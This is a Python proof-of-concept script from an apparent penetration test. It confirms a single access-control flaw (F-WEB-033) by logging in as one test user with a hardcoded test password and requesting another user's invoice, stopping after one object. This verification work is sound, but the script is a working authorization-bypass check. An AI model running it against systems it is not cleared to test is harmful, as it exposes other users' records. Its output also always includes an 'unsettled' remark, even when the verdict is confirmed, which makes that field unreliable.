#!/usr/bin/python3
"""Prove F-WEB-033 on one object, then stop.

The scanner saw sequential identifiers; it cannot know who may see what. The
proof is an authorization differential: principal A asks for an object that
belongs to B, and the application answers with it. One record, no enumeration.
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

try:
    import requests
except ImportError:  # the lab box may not ship it
    requests = None


def fetch(url, params=None, data=None, method="GET", session=None, timeout=8):
    """One place where the HTTP work happens: requests when present, urllib
    otherwise. Returns (status, headers, body) or (None, {}, reason)."""
    if requests is not None:
        try:
            client = session or requests
            response = client.request(
                method, url, params=params, data=data, timeout=timeout
            )
            return response.status_code, dict(response.headers), response.text
        except Exception as exc:
            return None, {}, str(exc)
    query = ""
    if params:
        query = "?" + urllib.parse.urlencode(params)
    payload = urllib.parse.urlencode(data).encode() if data else None
    request = urllib.request.Request(url + query, data=payload, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return (
                response.status,
                dict(response.headers),
                response.read().decode("utf-8", "replace"),
            )
    except urllib.error.HTTPError as exc:
        return (
            exc.code,
            dict(exc.headers or {}),
            exc.read().decode("utf-8", "replace"),
        )
    except (urllib.error.URLError, TimeoutError, OSError, ValueError) as exc:
        return None, {}, str(exc)


def emit(result):
    if result.get("verdict") == "unconfirmed" and "to_settle" not in result:
        result["to_settle"] = "the live behaviour did not settle the claim"
    print(json.dumps(result, indent=2))


# two principals, one object: A asks for what belongs to B and should be denied
PRINCIPAL_A = "test-user-a"
PRINCIPAL_B = "test-user-b"
OBJECT_ID = 1041
ENDPOINT = "/api/v1/invoices/%d" % OBJECT_ID


def login(base, user, password):
    if requests is None:
        return None
    session = requests.Session()
    session.post(
        base + "/login",
        data={"username": user, "password": password},
        timeout=8,
        allow_redirects=False,
    )
    return session


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--user", default=PRINCIPAL_A)
    parser.add_argument("--password", default="HalcyonTestA!")
    args = parser.parse_args()
    base = args.target.rstrip("/")

    session = login(base, args.user, args.password)
    status, _, body = fetch(base + ENDPOINT, session=session)

    evidence = {
        "principal_a": args.user,
        "principal_b": PRINCIPAL_B,
        "requested_object": "invoice %d, owned_by %s"
        % (OBJECT_ID, PRINCIPAL_B),
        "result": "no answer",
    }
    verdict = "unconfirmed"
    if status is None:
        evidence["error"] = body
    elif status == 200 and "1041" in body:
        verdict = "confirmed"
        evidence["result"] = (
            "B's record returned to A, who is not " "authorized"
        )
        evidence["http_status"] = status
    elif status in (401, 403, 404):
        verdict = "false_positive"
        evidence["result"] = (
            "access refused for a principal that does not own it"
        )
        evidence["http_status"] = status

    emit(
        {
            "finding": "F-WEB-033",
            "class": "broken_access_control",
            "verdict": verdict,
            "evidence": evidence,
            "stopped_at": "one unauthorized object proven; no enumeration",
            "to_settle": "the response did not show the object nor refuse it "
            "explicitly",
        }
    )


if __name__ == "__main__":
    main()
